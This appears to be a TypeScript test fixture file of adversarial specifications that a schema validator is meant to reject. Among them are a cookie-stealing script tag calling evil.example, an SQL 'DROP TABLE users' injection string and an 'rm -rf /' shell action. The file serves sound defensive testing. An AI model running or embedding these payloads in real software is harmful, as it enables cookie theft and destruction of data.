import { SPEC_SCHEMA_VERSION, LIMITS } from "../constants";

/**
 * Invalid/adversarial specification fixtures — one per attack/error
 * category the M04 issue requires coverage for. Every export here is
 * deliberately malformed: some fail Zod's shape parse (`ApplicationSpecification.safeParse`),
 * others parse fine but fail `validateSpecification`'s semantic checks.
 * Typed as `unknown` since a valid `ApplicationSpecificationType` cannot,
 * by construction, hold these shapes.
 */

const baseValid = {
  schemaVersion: SPEC_SCHEMA_VERSION,
  app: { name: "Adversarial Fixture", slug: "adversarial-fixture" },
  branding: {},
  entities: [] as unknown[],
  relations: [] as unknown[],
  roles: [] as unknown[],
  permissions: [] as unknown[],
  navigation: [] as unknown[],
  pages: [] as unknown[],
  dashboard: { widgets: [] },
  actions: [] as unknown[],
  workflows: [] as unknown[],
};

/** Two entities sharing the same id — Zod-level shape is fine; caught by validateSpecification. */
export const duplicateIdsFixture: unknown = {
  ...baseValid,
  entities: [
    { id: "customer", machineName: "customer", name: "Customer", fields: [], indexes: [], archived: false },
    { id: "customer", machineName: "customer_dup", name: "Customer Dup", fields: [], indexes: [], archived: false },
  ],
};

/** A relation pointing at entities that don't exist. */
export const brokenRelationsFixture: unknown = {
  ...baseValid,
  entities: [{ id: "order", machineName: "order", name: "Order", fields: [], indexes: [], archived: false }],
  relations: [
    {
      id: "rel_ghost",
      name: "Order to nowhere",
      fromEntityId: "order",
      toEntityId: "does_not_exist",
      cardinality: "oneToMany",
      onDelete: "cascade",
      archived: false,
    },
  ],
};

/** A page component bound to an entity that doesn't exist. */
export const orphanedComponentReferencesFixture: unknown = {
  ...baseValid,
  pages: [
    {
      id: "orphan_page",
      name: "Orphan Page",
      path: "orphan",
      archived: false,
      components: [{ id: "orphan_table", kind: "dataTable", entityId: "ghost_entity", config: {}, order: 0 }],
    },
  ],
};

/**
 * A permission entry for a role that was never created — an attempt to
 * grant standing access to an identity outside the declared role set,
 * using a reserved-looking name ("system") as cover.
 */
export const privilegeEscalationFixture: unknown = {
  ...baseValid,
  entities: [{ id: "invoice", machineName: "invoice", name: "Invoice", fields: [], indexes: [], archived: false }],
  permissions: [
    { id: "perm_ghost", roleId: "system", entityId: "invoice", verb: "delete", effect: "allow" },
  ],
};

/** A script tag smuggled through a free-text description field. */
export const scriptInjectionFixture: unknown = {
  ...baseValid,
  app: { ...baseValid.app, description: "<script>fetch('https://evil.example/steal?c='+document.cookie)</script>" },
};

/** SQL injection shape smuggled through an entity description. */
export const sqlInjectionFixture: unknown = {
  ...baseValid,
  entities: [
    {
      id: "product",
      machineName: "product",
      name: "Product",
      description: "'; DROP TABLE users; --",
      fields: [],
      indexes: [],
      archived: false,
    },
  ],
};

/** A component `kind` outside the allowlisted set — fails Zod's discriminated enum. */
export const unsupportedComponentKindFixture: unknown = {
  ...baseValid,
  pages: [
    {
      id: "bad_page",
      name: "Bad Page",
      path: "bad",
      archived: false,
      components: [{ id: "raw_html_block", kind: "rawHtmlInjector", entityId: undefined, config: {}, order: 0 }],
    },
  ],
};

/** An action `kind` outside the allowlisted set — fails Zod's enum. */
export const unsupportedActionKindFixture: unknown = {
  ...baseValid,
  actions: [{ id: "shell_action", name: "Run shell", kind: "runShellCommand", config: { cmd: "rm -rf /" }, archived: false }],
};

/** More entities than LIMITS.MAX_ENTITIES allows — fails Zod's `.max()`. */
export const excessiveCollectionSizeFixture: unknown = {
  ...baseValid,
  entities: Array.from({ length: LIMITS.MAX_ENTITIES + 1 }, (_, i) => ({
    id: `entity_${i}`,
    machineName: `entity_${i}`,
    name: `Entity ${i}`,
    fields: [],
    indexes: [],
    archived: false,
  })),
};

/** Two condition steps whose branches point at each other — an infinite loop if ever executed. */
export const circularWorkflowFixture: unknown = {
  ...baseValid,
  workflows: [
    {
      id: "workflow_loop",
      name: "Infinite loop",
      trigger: { kind: "manual" },
      archived: false,
      steps: [
        {
          id: "step_a",
          kind: "condition",
          config: { onTrueStepId: "step_b", onFalseStepId: "step_b" },
        },
        {
          id: "step_b",
          kind: "condition",
          config: { onTrueStepId: "step_a", onFalseStepId: "step_a" },
        },
      ],
    },
  ],
};

/** A reserved SQL/JS keyword used as an entity machineName. */
export const reservedIdentifierFixture: unknown = {
  ...baseValid,
  entities: [{ id: "drop_entity", machineName: "drop", name: "Drop", fields: [], indexes: [], archived: false }],
};

export const adversarialFixtures = {
  duplicateIdsFixture,
  brokenRelationsFixture,
  orphanedComponentReferencesFixture,
  privilegeEscalationFixture,
  scriptInjectionFixture,
  sqlInjectionFixture,
  unsupportedComponentKindFixture,
  unsupportedActionKindFixture,
  excessiveCollectionSizeFixture,
  circularWorkflowFixture,
  reservedIdentifierFixture,
};
